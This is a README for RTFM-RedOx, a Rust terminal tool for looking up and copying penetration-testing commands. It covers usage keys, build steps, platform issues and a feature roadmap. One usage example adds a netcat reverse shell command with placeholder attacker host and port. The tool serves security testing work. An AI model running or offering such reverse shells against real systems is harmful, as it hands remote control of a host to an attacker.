RTFM-RedOx is meant to be an easier to use and updated replacement for [RTFM](https://github.com/leostat/rtfm) (inspired by the book, Red Team Field Manual) as well as something that works similarly to [Rev Shells](https://revshells.com/) or the [HackTools](https://addons.mozilla.org/en-US/firefox/addon/hacktools/) browser plugin.  All without the need to leave your terminal to search through notes or open a browser window, or continually run a python script with a lot of switches you'll never remember.  It's basically like having a terminal history and history search for commands you never type in your terminal but often type when you have a shell on a remote host or when interacting with a vulnerable web app.  That being said, the database also contains many commands you'd also run on your attack machine for things like nmap, impacket scripts (adding as I go), crackmapexec, and 

I'm currently using the sqlite database that [RTFM](https://github.com/leostat/rtfm) uses but that hasn't been updated in almost 6 years so I will be gradually adding new commands and pushing the edited db file to the repository.    


## Usage
```
Ctrl+r           Enter quick search mode to dynamically find commands as you type.
Ctrl+c           Copy currently selected command to clipboard.
Ctrl+u           URL-encode and then copy currently selected command to clipboard.
Crtl+h or hist   Display selectable history of already selected commands.
Ctrl+v           Paste from clipboard
info             Display info on the currently selected command.
env              Show currently set user variables
add -c           Add a command to the database e.g. 'add -c nc [LHOST] [LPORT] -e /bin/bash'
update           update database columns of currently selected command e.g. 'update comment bash reverse shell'.
Esc              Exit current mode.
help             Display help
Ctrl+q or exit   Exit redOx.
```

![demo](./redox-demo.gif)


## To Use
```bash
#if you don't already have rust installed
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

git clone https://github.com/gregscharf/RTFM-Redox.git
cd RTFM-Redox
cargo run --release
```

**Issues**
Debian distributions: If the linker fails during build, install the following packages.
```bash
sudo apt install libxcb1-dev libxcb-render0-dev libxcb-shape0-dev libxcb-xfixes0-dev
```

Kali: Sometimes the backspace/delete key requires Ctrl+Backspace/Delete to delete previous typed characters in terminal.  And in some cases Ctrl+h stops working so I've added a 'hist' command for when that occurs until I figure out some of the intermittent key stroke issues. 

Arch: No known issues

Mac M1: Screen flicker when using up/down arrows 

Windows: Currently not supported because Termion does not work on windows.  I'll switch to crossterm at some point.


## To Add
- [x] After adding a new command to the db select it as the current command.
- [ ] Add config file to store user set variables and other as yet to be determined configurations.
    - This might be the place for related commands that are often used together. Add ability to save the commands in the current history.  Would need a way to quickly delete a command in the current history e.g. highlight the command and then Ctrl+d to remove it. Also need to be able to completely clear the current history.  User would also need to supply a name for the history before it is saved to the config file.  These would be stored as an array of row IDs from TblCommand. Use the 'config' crate to facilitate this.  
- [ ] Ctrl+d while in selectable list deletes the item from the database, or if in history mode, deletes the item from the current history.
- [ ] Left/right arrow keys to edit already typed or pasted in command.  Really only useful when typing a long command to add to or update the database.
- [ ] Make use of tags already implemented in the database to display selectable list of grouped items. For example, 'reverse shells linux' to display all commands in the database grouped under that tag.  tags already in the database are probably a little too general to be useful e.g. 'bash', 'windows'.  Also need a function to display all tags in the database as a selectable list.
- [ ] Implement [RTFM](https://github.com/leostat/rtfm)'s solution for creating/updating the database
- [ ] Continue to updating database with newer commands for things like Bloodhound,ffuf,feroxbuster,Rubeus,Crackmapexec,Chisel,SSHuttle, etc.
- [ ] Tab auto complete for best match while in search mode.
- [ ] Switch from termion to crossterm for Windows support.
- [ ] Add search capability for text based/markdown notes.    
    - Root directory for user's notes will be supplied in a CLI variable/Config file.
    - Do a basic grep for a search term
    - Return dynamic list of selectable pathnames along with line the search term found in file
    - Default application to open file will be set via CLI variable/config file
    - When file is selected editor name plus path is copied to clipboard
- [ ] Use pre-existing 'refs' table to link to markdown notes and display notes in terminal when selected.

## To Fix
- [x] Add buffer to scroll through result output that doesn't fit within terminal windows.
- [x] Handle error when output exceeds terminal window so application doesn't crash on Arch.
    - Needs a much better solution
- [ ] Sometimes backspace/delete key requires Ctrl+Backspace/Delete to delete typed character preceding cursor.
- [ ] Switch from termion to crossterm to add support for Windows consoles.      
- [ ] Switch to rusqlite and dump sqlx to avoid openssl static build nightmare so I can create a release build.

